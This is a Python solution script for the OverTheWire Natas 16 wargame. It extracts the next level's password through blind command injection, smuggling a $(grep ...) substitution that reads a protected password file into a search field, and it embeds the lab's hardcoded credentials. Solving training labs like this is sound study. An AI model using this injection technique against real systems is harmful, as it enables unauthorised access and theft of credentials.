# OverTheWire Natas 16

import requests
import string

# URL and headers
url = "http://natas16.natas.labs.overthewire.org/"
# Update with correct credentials
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==",
    "Connection": "keep-alive",
    "Referer": "http://natas16.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas17&submit=Search",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Sec-GPC": "1"
}

# Characters to try in the password (alphanumeric and special characters as per the filter)
characters = string.ascii_letters + string.digits

# Initialize an empty password
password = ""

# Continue brute-forcing until password is 32 characters long
while len(password) < 32:
    found_char = False
    for char in characters:
        # Construct the payload with grep command to extract password character by character
        needle = f"halloweens$(grep ^{
            password+char} /etc/natas_webpass/natas17)"
        params = {"needle": needle, "submit": "Search"}

        # Send GET request
        response = requests.get(url, headers=headers, params=params, auth=auth)

        # Check if the response indicates the character is correct
        if "Halloweens" not in response.text:
            password += char
            found_char = True
            print(f"Current password: {password}")
            break

    # If no character was found, break out of the loop
    if not found_char:
        print("Failed to find next character. Exiting.")
        break

# Print the final password
print(f"Complete password found: {password}")
